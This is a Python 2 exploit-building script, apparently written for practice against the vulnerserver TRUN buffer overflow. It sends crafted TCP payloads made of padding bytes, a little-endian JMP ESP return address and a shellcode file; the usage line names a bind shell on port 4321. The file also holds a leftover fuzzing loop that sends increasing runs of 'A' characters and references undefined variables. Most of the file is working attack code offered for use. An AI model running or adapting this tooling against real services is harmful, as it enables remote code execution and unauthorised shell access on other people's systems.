## TODO:
##  Integrate boofuzz abilities in to script

#GENERATING SHELLCODE:
#USAGE: python dirtyharry.py --host 192.168.10.111 --port 9999 --char1 "90" --char1len 2002 --fromhex "af115062909090909090909090" --file ~/vulnserver/newbind_p4321-raw.txt --init "TRUN /.../"
import sys, socket, fileinput, argparse
parser = argparse.ArgumentParser()
parser.add_argument("--file", "-f", type=str, required=False)   #Placed between --init and --trail when used
parser.add_argument("--host", "-c", type=str, required=True)
parser.add_argument("--port", "-p", type=int, required=True)
parser.add_argument("--startlen", "-s", type=int, required=False)   #This is not currently being actively used
parser.add_argument("--endlen", "-e", type=int, required=False) #This is not currently being actively used
parser.add_argument("--char1", "-q", required=False) #Placed between --init and --trail when used
parser.add_argument("--char1len", "-y", type=int, required=False) #Placed between --init and --trail when used
parser.add_argument("--char2", "-t", type=str, required=False) #This is not currently being actively used
parser.add_argument("--string", "-r", type=str, required=False) #Placed between --init and --trail when used
parser.add_argument("--fromhex", "-l", required=False) #Placed after charinput and string if it exists. before shellcode. should be used for jmp esp address. Remember to reverse the address listed in the access violation as it is little endian
parser.add_argument("--fromhex2", "-m", required=False) #Placed after charinput and string if it exists. before shellcode. should be used for jmp esp address. Remember to reverse the address listed in the access violation as it is little endian
parser.add_argument("--init", "-i", type=str, required=False)   #Placed at the beginning of the input to be sent
parser.add_argument("--inithex", "-ih", type=str, required=False)   #Placed at the beginning of the input to be sent
parser.add_argument("--trail", "-a", type=str, required=False)  #Placed at the end of the input to be sent
args = parser.parse_args()
if args.init is None:
    args.init = ""
if args.inithex is None:
    args.inithex = ""
if args.trail is None:
    args.trail = ""
if args.char1 is None:
    args.char1 = ""
    charinput = ""
else:
    charinput = args.char1.decode("hex") * args.char1len
if args.string is not None:
    charinput = charinput + args.string
if args.fromhex is not None:
    charinput = charinput + args.fromhex.decode("hex")
    #print args.fromhex.decode("hex")
if args.fromhex2 is not None:
    charinput = charinput + args.fromhex2.decode("hex")
    #print args.fromhex2.decode("hex")
input = args.init + args.inithex.decode("hex") + charinput
if args.file is not None:
    with open(args.file, 'r') as fileinput:
            input = args.init + args.inithex.decode("hex") + charinput + fileinput.read()
if args.trail is not None:
    input = input + args.trail
#elif args.char1 is not None:
#    input = args.init + args.char1 + args.trail
#elif args.string is not None:
#    input = args.init + args.string + args.trail
#host = sys.argv[1]
#port = int(sys.argv[2])
#max_length = 5000#int(sys.argv[3])
static_send = 1
#start_length = 100
if static_send == 0:
  while start_length < max_length:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((args.host, args.port))
    client.recv(1024)
    client.send("TRUN" + "A" * length)
    client.recv(1024)
    client.close()
    print "Length sent: " + str(start_length)
    length += 100
elif static_send == 1:
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print "Sending: " + str(input)
  client.connect((args.host, args.port))
  #client.recv(1024)
  client.send(input)
  #client.send("TRUN" + "A" * start_length)
  client.recv(1024)
  client.close()
